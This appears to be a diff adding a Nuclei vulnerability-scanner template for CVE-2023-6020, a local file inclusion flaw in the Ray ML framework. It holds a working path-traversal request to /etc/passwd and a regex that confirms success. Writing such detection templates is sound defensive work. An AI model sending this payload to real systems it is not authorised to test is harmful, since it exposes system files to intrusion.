@@ -1,0 +1,30 @@
+id: ray-static-lfi
+
+info:
+  name: Ray Static File Local File Inclusion
+  author: danmcinerney (Vuln Discovery), byt3bl33d3r (Nuclei Template)
+  severity: high
+  description: Ray is vulnerable to a LFI when accessing static files
+  reference:
+    - https://huntr.com/bounties/83dd8619-6dc3-4c98-8f1b-e620fedcd1f6/
+  classification:
+    cvss-score: 8.6
+    cve-id: CVE-2023-6020
+    cwe-id: CWE-29
+  tags: ray,ml,cve,huntr,protectai
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static/js/../../../../../../../../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
